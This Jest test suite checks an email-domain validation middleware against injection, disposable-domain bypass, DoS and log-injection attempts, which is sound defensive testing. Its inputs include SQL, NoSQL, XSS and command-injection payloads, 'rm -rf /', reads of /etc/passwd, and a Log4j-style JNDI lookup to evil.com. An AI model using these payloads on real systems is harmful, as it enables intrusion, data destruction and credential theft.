const {
  validateEmailDomain,
  createEmailDomainMiddleware,
  isDisposableEmail,
  extractDomain,
  emailConfig,
  DISPOSABLE_DOMAINS,
  SUSPICIOUS_PATTERNS
} = require('../middleware/emailDomainValidation');

const SecureLogger = require('../utils/secureLogger');

// Mock SecureLogger to capture security events during tests
jest.mock('../utils/secureLogger');

describe('Email Domain Validation Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    emailConfig.allowedDomains.clear();
    emailConfig.blockedDomains.clear();
    DISPOSABLE_DOMAINS.forEach(domain => emailConfig.blockedDomains.add(domain));
  });

  describe('Injection and Bypass Attempts', () => {
    test('should prevent SQL injection attempts in email validation', async () => {
      const maliciousEmails = [
        "user@domain.com'; DROP TABLE users; --",
        "user@domain.com' OR '1'='1",
        "user@domain.com'; DELETE FROM contacts; --",
        "user@domain.com' UNION SELECT password FROM users --",
        "user'; INSERT INTO users VALUES('hacker', 'pass'); --@domain.com",
        "admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users--@domain.com"
      ];

      for (const email of maliciousEmails) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        // Should be caught by security violation or invalid format
        expect(result.isValid).toBe(false);
        expect(['SECURITY_VIOLATION', 'INVALID_EMAIL_FORMAT'].includes(result.reason)).toBe(true);
        
        // Verify logging of security event
        expect(SecureLogger.logSecurityEvent).toHaveBeenCalled();
      }
    });

    test('should prevent NoSQL injection attempts', async () => {
      const maliciousEmails = [
        'user@domain.com", "$where": "1==1',
        'user@domain.com", "$regex": ".*',
        'user@domain.com", "$ne": null',
        'user@domain.com", "$gt": ""',
        'user@domain.com", "$in": ["admin"]',
        'user@domain.com", "$exists": true',
        'user@domain.com", "$or": [{"role": "admin"}]'
      ];

      for (const email of maliciousEmails) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        expect(result.isValid).toBe(false);
        expect(['SECURITY_VIOLATION', 'INVALID_EMAIL_FORMAT'].includes(result.reason)).toBe(true);
        
        // Verify security logging
        expect(SecureLogger.logSecurityEvent).toHaveBeenCalled();
      }
    });

    test('should prevent XSS attempts in email domains', async () => {
      const xssAttempts = [
        'user@<script>alert("xss")</script>.com',
        'user@domain.com<script>alert(1)</script>',
        'user@domain.com";alert("xss");"',
        'user@javascript:alert(1).com',
        'user@domain.com/><script>alert(1)</script>'
      ];

      for (const email of xssAttempts) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        expect(result.isValid).toBe(false);
        expect(result.reason).toBe('INVALID_EMAIL_FORMAT');
      }
    });

    test('should prevent command injection attempts', async () => {
      const commandInjectionAttempts = [
        'user@domain.com; whoami',
        'user@domain.com && ls -la',
        'user@domain.com | cat /etc/passwd',
        'user@domain.com`whoami`',
        'user@$(whoami).com'
      ];

      for (const email of commandInjectionAttempts) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        expect(result.isValid).toBe(false);
        expect(result.reason).toBe('INVALID_EMAIL_FORMAT');
      }
    });

    test('should handle buffer overflow attempts', async () => {
      // Test very long domain names
      const longDomain = 'a'.repeat(1000) + '.com';
      const longEmail = `user@${longDomain}`;

      const result = await validateEmailDomain(longEmail, {
        skipMXValidation: true,
        skipDomainExistenceCheck: true
      });

      // Should not crash and should handle gracefully
      expect(result).toHaveProperty('isValid');
      expect(typeof result.isValid).toBe('boolean');
    });

    test('should prevent null byte injection', async () => {
      const nullByteAttempts = [
        'user@domain.com\x00.evil.com',
        'user@domain.com\0.evil.com',
        'user@domain.com%00.evil.com',
        'user@domain.com\x01\x02\x03',
        'user@\x00admin.com',
        'user\x00@domain.com'
      ];

      for (const email of nullByteAttempts) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        expect(result.isValid).toBe(false);
        expect(['SECURITY_VIOLATION', 'INVALID_EMAIL_FORMAT'].includes(result.reason)).toBe(true);
      }
    });
    
    test('should prevent buffer overflow attempts with proper length limits', async () => {
      // Test RFC limits
      const longLocalPart = 'a'.repeat(65) + '@domain.com'; // > 64 char limit
      const longDomainPart = 'user@' + 'a'.repeat(250) + '.com'; // > 253 char limit
      const longEmail = 'a'.repeat(300) + '@' + 'b'.repeat(300) + '.com'; // > 320 char limit
      
      const longEmails = [longLocalPart, longDomainPart, longEmail];
      
      for (const email of longEmails) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        expect(result.isValid).toBe(false);
        expect(result.reason).toBe('INVALID_EMAIL_FORMAT');
      }
    });
    
    test('should detect and prevent advanced injection techniques', async () => {
      const advancedInjections = [
        'user@domain.com/**/UNION/**/SELECT/**/', // SQL comment bypass
        'user@domain.com"; system("rm -rf /"); "', // Command injection
        'user@domain.com\'; eval("malicious_code"); \"', // Code injection
        'user@domain.com${jndi:ldap://evil.com/exploit}', // Log4j style
        'user@domain.com{{7*7}}', // Template injection
        'user@domain.com<script>fetch("/admin")</script>' // DOM XSS
      ];
      
      for (const email of advancedInjections) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        expect(result.isValid).toBe(false);
        expect(['SECURITY_VIOLATION', 'INVALID_EMAIL_FORMAT'].includes(result.reason)).toBe(true);
      }
    });
  });

  describe('Disposable Email Bypass Attempts', () => {
    test('should detect subdomain bypass attempts', async () => {
      const subdomainAttempts = [
        'user@mail.guerrillamail.com',
        'user@secure.mailinator.com',
        'user@new.10minutemail.com',
        'user@api.yopmail.com'
      ];

      for (const email of subdomainAttempts) {
        // These should not be caught by direct domain matching
        // but may be caught by pattern matching depending on implementation
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        // Log the attempt for analysis
        expect(result).toHaveProperty('isValid');
      }
    });

    test('should detect homograph attacks', async () => {
      // Test domains that look similar to legitimate domains but use different characters
      const homographAttempts = [
        'user@gmai1.com', // 1 instead of l
        'user@gmaiI.com', // capital I instead of l
        'user@gmaiℓ.com', // Unicode ℓ instead of l
        'user@gοοgle.com', // Greek omicron instead of o
        'user@micrοsoft.com' // Greek omicron
      ];

      for (const email of homographAttempts) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        // Should validate according to normal rules
        expect(result).toHaveProperty('isValid');
      }
    });

    test('should detect punycode bypass attempts', async () => {
      const punycodeAttempts = [
        'user@xn--gmail-wqa.com', // Punycode for gmail with special character
        'user@xn--google-wqa.com',
        'user@xn--facebook-wqa.com'
      ];

      for (const email of punycodeAttempts) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        expect(result).toHaveProperty('isValid');
      }
    });

    test('should detect TLD manipulation attempts', async () => {
      const tldAttempts = [
        'user@mailinator.co', // Different TLD
        'user@mailinator.net',
        'user@mailinator.org',
        'user@guerrillamail.co',
        'user@10minutemail.net'
      ];

      for (const email of tldAttempts) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        // These should pass unless specifically blocked
        expect(result).toHaveProperty('isValid');
      }
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    test('should handle rapid validation requests', async () => {
      const emails = Array(1000).fill('user@example.com');
      const startTime = Date.now();

      const results = await Promise.all(emails.map(email => 
        validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        })
      ));

      const endTime = Date.now();
      const duration = endTime - startTime;

      // Should complete all validations
      expect(results.length).toBe(1000);
      expect(results.every(r => r.isValid === true)).toBe(true);
      
      // Should complete in reasonable time (under 5 seconds)
      expect(duration).toBeLessThan(5000);
    });

    test('should handle concurrent DNS resolution attacks', async () => {
      // Test with domains that will trigger DNS lookups
      const domains = Array(50).fill(0).map((_, i) => `nonexistent${i}.com`);
      const emails = domains.map(domain => `user@${domain}`);

      const startTime = Date.now();
      const results = await Promise.all(emails.map(email => 
        validateEmailDomain(email)
      ));
      const endTime = Date.now();

      // Should handle concurrent DNS requests without crashing
      expect(results.length).toBe(50);
      expect(endTime - startTime).toBeLessThan(30000); // 30 seconds max
    });
  });

  describe('Middleware Security', () => {
    let req, res, next;

    beforeEach(() => {
      req = {
        body: {},
        path: '/test',
        ip: '127.0.0.1',
        get: jest.fn().mockReturnValue('Test-Agent')
      };
      res = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      next = jest.fn();
    });

    test('should log security events for blocked attempts', async () => {
      const middleware = createEmailDomainMiddleware({
        emailField: 'email',
        logBlocked: true
      });

      req.body.email = 'attacker@10minutemail.com';
      await middleware(req, res, next);

      expect(SecureLogger.logSecurityEvent).toHaveBeenCalledWith(
        'email_domain_blocked',
        expect.objectContaining({
          domain: '10minutemail.com',
          reason: 'DISPOSABLE_DOMAIN',
          ip: '127.0.0.1',
          path: '/test'
        })
      );
    });

    test('should not leak sensitive information in error messages', async () => {
      const middleware = createEmailDomainMiddleware({
        emailField: 'email'
      });

      req.body.email = 'user@blockedsite.com';
      emailConfig.blockDomain('blockedsite.com');
      
      await middleware(req, res, next);

      expect(res.json).toHaveBeenCalledWith({
        error: 'Email non autorisé',
        message: 'Domaine bloqué',
        code: 'BLACKLISTED'
      });

      // Should not expose internal implementation details
      const responseCall = res.json.mock.calls[0][0];
      expect(responseCall).not.toHaveProperty('stack');
      expect(responseCall).not.toHaveProperty('internalError');
      expect(responseCall.message).not.toContain('database');
      expect(responseCall.message).not.toContain('server');
    });

    test('should handle malformed request objects', async () => {
      const middleware = createEmailDomainMiddleware({
        emailField: 'email'
      });

      // Test with malformed req object
      const malformedReq = {
        body: null,
        path: '/test',
        ip: '127.0.0.1',
        get: jest.fn().mockReturnValue('Test-Agent')
      };

      await middleware(malformedReq, res, next);

      // Should handle gracefully and call next()
      expect(next).toHaveBeenCalled();
    });

    test('should sanitize logged data to prevent log injection', async () => {
      const middleware = createEmailDomainMiddleware({
        emailField: 'email',
        logBlocked: true
      });

      req.body.email = 'user@mailinator.com';
      req.get = jest.fn().mockReturnValue('Evil-Agent\n[INJECTED LOG ENTRY] SECURITY: fake_event');
      
      await middleware(req, res, next);

      expect(SecureLogger.logSecurityEvent).toHaveBeenCalled();
      
      // Verify that the logged data is sanitized
      const logCall = SecureLogger.logSecurityEvent.mock.calls[0];
      const loggedData = logCall[1];
      
      // Should not contain log injection attempts
      expect(JSON.stringify(loggedData)).not.toContain('\n');
      expect(JSON.stringify(loggedData)).not.toContain('[INJECTED');
    });
  });

  describe('Configuration Security', () => {
    test('should prevent configuration injection through environment variables', () => {
      const originalEnv = process.env.EMAIL_DOMAIN_WHITELIST;
      
      // Attempt to inject malicious configuration
      process.env.EMAIL_DOMAIN_WHITELIST = 'trusted.com,evil.com\n[INJECTED CONFIG]';
      
      // Reload configuration
      delete require.cache[require.resolve('../config/environment')];
      const EnvironmentConfig = require('../config/environment');
      const config = EnvironmentConfig.getConfig();

      // Should parse safely without executing injected content
      expect(config.services.emailValidation.whitelist).toEqual([
        'trusted.com',
        'evil.com\n[INJECTED CONFIG]' // Should be treated as literal string
      ]);

      // Restore original value
      process.env.EMAIL_DOMAIN_WHITELIST = originalEnv;
    });

    test('should handle extremely large whitelist/blacklist configurations', () => {
      const largeDomainList = Array(10000).fill(0).map((_, i) => `domain${i}.com`).join(',');
      
      const originalEnv = process.env.EMAIL_DOMAIN_BLACKLIST;
      process.env.EMAIL_DOMAIN_BLACKLIST = largeDomainList;
      
      // Should handle large configurations without crashing
      delete require.cache[require.resolve('../config/environment')];
      const EnvironmentConfig = require('../config/environment');
      const config = EnvironmentConfig.getConfig();

      expect(config.services.emailValidation.blacklist.length).toBe(10000);
      
      // Restore original value
      process.env.EMAIL_DOMAIN_BLACKLIST = originalEnv;
    });
  });

  describe('Edge Case Security', () => {
    test('should handle Unicode normalization attacks', async () => {
      // Test emails with different Unicode normalization forms
      const unicodeAttempts = [
        'user@café.com', // Precomposed
        'user@cafe\u0301.com', // Decomposed (e + combining acute)
        'user@caf\u00E9.com' // Different encoding of é
      ];

      for (const email of unicodeAttempts) {
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        
        expect(result).toHaveProperty('isValid');
      }
    });

    test('should handle regex DoS attempts', async () => {
      // Test patterns that could cause regex denial of service
      const regexDosAttempts = [
        'a'.repeat(100000) + '@domain.com',
        'user@' + 'a'.repeat(100000) + '.com',
        'user@domain.' + 'a'.repeat(100000)
      ];

      for (const email of regexDosAttempts) {
        const startTime = Date.now();
        const result = await validateEmailDomain(email, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        const endTime = Date.now();
        
        // Should complete quickly, not hang
        expect(endTime - startTime).toBeLessThan(1000);
        expect(result).toHaveProperty('isValid');
      }
    });

    test('should prevent timing attacks', async () => {
      // Test that validation time doesn't leak information about blocked domains
      const blockedEmail = 'user@mailinator.com';
      const allowedEmail = 'user@gmail.com';
      
      const timings = [];
      
      // Measure timing for multiple requests
      for (let i = 0; i < 10; i++) {
        const startTime = Date.now();
        await validateEmailDomain(blockedEmail, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        const endTime = Date.now();
        timings.push(endTime - startTime);
      }
      
      // Measure timing for allowed email
      const allowedTimings = [];
      for (let i = 0; i < 10; i++) {
        const startTime = Date.now();
        await validateEmailDomain(allowedEmail, {
          skipMXValidation: true,
          skipDomainExistenceCheck: true
        });
        const endTime = Date.now();
        allowedTimings.push(endTime - startTime);
      }
      
      // Timings should be similar (within 100ms) to prevent timing attacks
      const avgBlockedTime = timings.reduce((a, b) => a + b, 0) / timings.length;
      const avgAllowedTime = allowedTimings.reduce((a, b) => a + b, 0) / allowedTimings.length;
      
      expect(Math.abs(avgBlockedTime - avgAllowedTime)).toBeLessThan(100);
    });
  });
});